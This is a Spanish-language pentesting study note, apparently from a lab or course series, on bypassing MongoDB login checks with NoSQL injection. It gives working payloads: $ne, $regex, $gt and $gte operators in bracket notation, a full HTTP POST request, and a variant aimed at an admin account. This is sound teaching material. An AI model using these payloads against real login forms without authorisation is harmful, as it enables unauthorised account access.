---
tags:
  - Web/Red-Team
  - NoSQLi
  - Pentesting/Explotacion
Descripción: "El uso más directo de la NoSQLi es el bypass de autenticación: inyectar operadores para que la consulta de credenciales devuelva un usuario sin conocer email ni contraseña"
Fecha de actualización: 2026-07-16
Nota previa: "[[02 - Detección de NoSQL injection]]"
Nota siguiente: "[[04 - Extracción de datos in-band]]"
Area: "[[NoSQL Injection.base|NoSQL Injection]]"
---
---

El uso más directo de la NoSQLi es el **bypass de autenticación**: inyectar operadores para que la consulta de credenciales devuelva un usuario **sin conocer email ni contraseña**. Es el análogo del [[02 - Bypass de autenticación con LDAP|bypass en LDAP]], adaptado a la inyección de operadores MongoDB.

# El login vulnerable

Un portal (MangoMail) construye la consulta con email y contraseña sin sanitizar:

```javascript
db.mangomail.users.find({email: <email>, password: <password>})
```

Ambos son entrada del usuario → controlamos los dos operandos.

# Bypass con `$ne` (not equal)

La idea: pedir un documento donde el email **no sea** un valor inválido conocido y la contraseña **tampoco** — lo que casa con los usuarios reales:

```javascript
db.users.find({email: {$ne: "test@test.com"}, password: {$ne: "test"}})
```

> [!important]+ La notación de corchetes: inyectar operadores en params URL-encoded
> El *gotcha* práctico: si el endpoint no acepta JSON sino parámetros `application/x-www-form-urlencoded`, no puedes mandar `{"$ne": ...}` directamente. <mark style="background: #8000E1A6;">La sintaxis `param[$op]=val` hace que PHP/Express parseen el parámetro como un objeto</mark> — `email[$ne]=test@test.com` se convierte en `['email' => ['$ne' => 'test@test.com']]`:
> ```http
> POST /index.php HTTP/1.1
> Content-Type: application/x-www-form-urlencoded
>
> email[$ne]=test@test.com&password[$ne]=test
> ```
> Sin esta notación solo puedes enviar strings; con ella, operadores. Es la clave para explotar formularios clásicos, no solo APIs JSON.

# Consultas alternativas

Conviene tener varias en la recámara (por si un operador está filtrado):

```text
# $regex que casa cualquier cosa
email[$regex]=.*&password[$regex]=.*

# Atacar directamente al admin (conocido su email)
email=admin@mangomail.com&password[$ne]=x

# Cualquier string es "mayor que" la cadena vacía
email[$gt]=&password[$gt]=
email[$gte]=&password[$gte]=
```

<mark style="background: #FFB86CA6;">Todos logran lo mismo: que el filtro case al menos un documento</mark> sin credenciales válidas. Se pueden mezclar operadores según lo que el servidor acepte.

> [!success]+
> Si el formulario pasa de "credenciales inválidas" a sesión iniciada (o suelta la flag), el bypass funcionó. En bug bounty, probar `[$ne]`/`[$gt]` en cualquier login es un test de 30 segundos que a veces abre la puerta.

Con acceso, el siguiente objetivo es extraer datos de la base: [[04 - Extracción de datos in-band]].
